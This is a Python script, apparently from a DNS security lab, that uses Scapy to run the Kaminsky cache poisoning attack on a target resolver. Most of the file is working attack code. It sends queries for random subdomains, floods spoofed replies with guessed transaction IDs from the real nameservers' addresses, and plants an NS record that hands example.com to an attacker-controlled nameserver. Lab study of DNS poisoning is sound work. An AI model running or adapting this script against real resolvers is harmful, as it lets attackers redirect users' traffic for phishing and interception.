from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
import random, string, time


targetDomain = "example.com" #Domain to attack
targetDNS = "10.9.0.53" #Target DNS Servers IP
attacker = "ns.attacker32.com" #Malicious nameserver

sourceIP = "10.9.0.1" #Attacker machine IP
nsIPs = ["199.43.133.53", "199.43.135.53"] # Both nameserver IPs to spoof responses from
port = 33333 #Fixed source port

class KaminskyAttack:
    def __init__(self):
        self.packet_count = 0
        self.socket = conf.L3socket() #Create socket connection at network layer to improve sending speeds
        self.start_time = time.time()

    def generateNames(self):
        return ''.join(random.choices(string.ascii_lowercase, k=5)) #Generate random subdomain of length 5
    
    def DNSReq(self, subdomain):
        ip = IP(src=sourceIP, dst=targetDNS)
        udp = UDP(sport=port, dport=53)
        
        dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=DNSQR(qname=subdomain + '.' + targetDomain, qtype='A')) #Question = 1, set our subdomain as well

        req = ip/udp/dns #Combine packet and send using socket to improve speed
        self.socket.send(req)

    def DNSReply(self, subdomain, ns_ip, trans_id):
        ip = IP(src=ns_ip, dst=targetDNS)
        udp = UDP(dport=port, sport=53)
        dns = DNS(id=trans_id, aa=1, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=1, 
                  qd=DNSQR(qname=subdomain + '.' + targetDomain), #Query question we sent originally 
                  an=DNSRR(rrname=targetDomain, type='A', ttl=70000,rdata="10.9.0.153"), #Answer, mapping malicious domain to IP
                  ns=DNSRR(rrname=targetDomain, type='NS', ttl=70000, rdata=attacker)) #Name

        reply = ip/udp/dns #Combine packet
        return reply

    def genTransID(self):
        return random.randint(1024, 65535) #Generate random integer for transaction ID

    def StartAttack(self):
        print(f"[+] Starting Kaminsky Attack")
        print(f"[+] Target Domain: {targetDomain}")
        print(f"[+] Target DNS Server: {targetDNS}")
        print(f"[+] Attacker NS: {attacker}")
        print(f"[+] Using nameservers: {', '.join(nsIPs)}")


        while True:
            try:
                self.packet_count += 1
                subdomain = self.generateNames()

                # Send DNS request
                self.DNSReq(subdomain)
                
                # Send multiple spoofed responses with different transaction IDs

                for x in range(10):  # 10 attempts per nameserver
                    trans_id = self.genTransID()
                    
                    # Send response spoofing both nameservers
                    for ns in nsIPs:
                        pkt_answer = self.DNSReply(subdomain, ns, trans_id)
                        self.socket.send(pkt_answer)
                

                if self.packet_count % 100 == 0:
                    print(f"\r[+] Packets sent: {self.packet_count}, Current subdomain: {subdomain}")

            except KeyboardInterrupt:
                end_time = time.time()
                elapsed_time = end_time - self.start_time
                mins = int(elapsed_time // 60)
                sec = elapsed_time % 60

                print(f"\n[-] Attack stopped after {self.packet_count} attempts")
                if mins > 0:
                    print(f"\n[-] Total Elapsed time {mins} Minutes and {sec:.2f} seconds")
                else:
                    print(f"\n[-] Total Elapsed time {elapsed_time:.2f} Seconds")
                break
